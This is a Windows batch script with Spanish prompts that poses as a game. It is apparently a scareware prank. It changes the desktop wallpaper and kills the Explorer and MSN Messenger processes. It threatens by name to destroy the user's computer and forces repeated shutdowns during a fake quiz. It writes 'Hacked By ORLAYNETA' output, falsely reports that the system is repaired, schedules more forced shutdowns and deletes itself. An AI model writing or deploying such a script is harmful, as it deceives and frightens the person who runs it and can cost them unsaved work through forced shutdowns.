@echo off
REG ADD "HKCU\Control Panel\Desktop" /V Wallpaper /T REG_SZ /F /D "%SystemRoot%\fondomalo.jpg"
REG ADD "HKCU\Control Panel\Desktop" /V WallpaperStyle /T REG_SZ /F /D 2
%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters


::shutdown.exe -s -t 00

@echo off
title gamebatch
color 1f
echo.
msg * Una ves abierto esto no lo debes de cerrar...
echo.
taskkill /IM explorer.exe /f
taskkill /f /IM msnmsgr.exe
echo.
set /p nombre= Cual es tu nombre?
cls
echo.
echo Hola %nombre%. Sabias que este juego es un juego para determinar
echo el estado de tu PC?.. Te has portado muy mal, por lo cual hoy te castigare.
echo Voy a eliminar todo de tu computadora, pero si quieres que
echo no le pase nada y siga normal.. deberas jugar este juego.
pause
echo solo por si creias que esto es una broma.. te digo que no lo es, te estoy viendo:
echo %USERNAME%, pronto te destruire..
echo.
pause
cls
echo ahora.. ¿quieres jugar el juego para salvar tu trasero?
set /p peti= ¿Aceptas? s/n
echo.
echo.
echo Esta es la regla: Te voy a dar 30segs para que me
echo respondas 3 preguntas.. y si no las respondes a tiempo.
echo tu pc se apagará... y no podra volver a iniciar.
echo.
echo ¿Listo?
shutdown -s -f -t 30
set /p primera=¿Cual es la formula mas famosa de Alber Einstein?
echo.
echo Exelente, siguiente:
shutdown -a
shutdown -s -f -t 30
set /p segunda=¿Quien es el jugador de futbol mas famoso del mundo?
echo Tenias que ser aficionado.. aun asi te has salvado por un pelo.
shutdown -a
echo.
echo Estas preguntas estuvieron muy faciles. Ahora te tocara la ultima...
echo Si fallas, dile adios a tu pc %USERNAME%
pause
cls
echo Bueno, Aqui va!:
shutdown -f -s -t 30
set /p tercera=¿En verdad creiste que esto te descomopondria tu PC?
shutdown -a
echo.
echo JAJAJAJAJAJA...Pues La Verdad SI!
echo pero como veo has contestado las preguntas 2/3
echo pasaste La Prueba ;)
pause
cls
echo f
cls
echo fe
cls
echo fel
cls
echo feli
cls
echo felic
cls
echo felici
cls
echo felicid
cls
echo felicidad
cls
echo felicidade
cls
echo felicidades
echo
echo Hora en que pasaste la prueba...
time
echo.
echo Ahora se un buen chico ;)...
pause
cls
title Warning!!
echo off>>Hacked By ORLAYNETA
------------------------------------------
echo.
echo off>>Hacked By  ORLAYNETA
echo.
echo off>>Hacked By ORLAYNETA
echo.
echo off>>Hacked By  ORLAYNETA
echo.
echo off>>Hacked By ORLAYNETA
echo.
echo off>>Hacked By  ORLAYNETA
echo.
echo off>>Hacked By ORLAYNETA
echo.
echo off>>Hacked By  ORLAYNETA
echo.
echo off>>Hacked By ORLAYNETA
-------------------------------------------
msg * Fue un placer jugar contigo.
msg * Ahora se apagara el PC y todo estara arreglado.
title Vacuna!
msg * Recuperando visualizacion de windows...
msg * Finalizando...
msg * Reparado.
cls
echo reparando.
cls
echo reparando..
cls
echo reparando...
cls
start explorer.exe
echo.
echo Ya se recupero todo el sistema...
echo.
set /p Te asusto todo esto? (si/no)
echo Hahahaha si claro.
echo Bueno adios %USERNAME%...
echo.
shutdown -s -f -t 10
shutdown -a
msg * Solo bromeaba, estas jodido :D.
shutdown -s -f -t 120
del %0
echo Atte: CASTIGONATOR 2.0...
shutdown -s -f -t 120
echo.
pause
exit
shutdown -s -f -t 100
set /p Oprime una tecla para salir...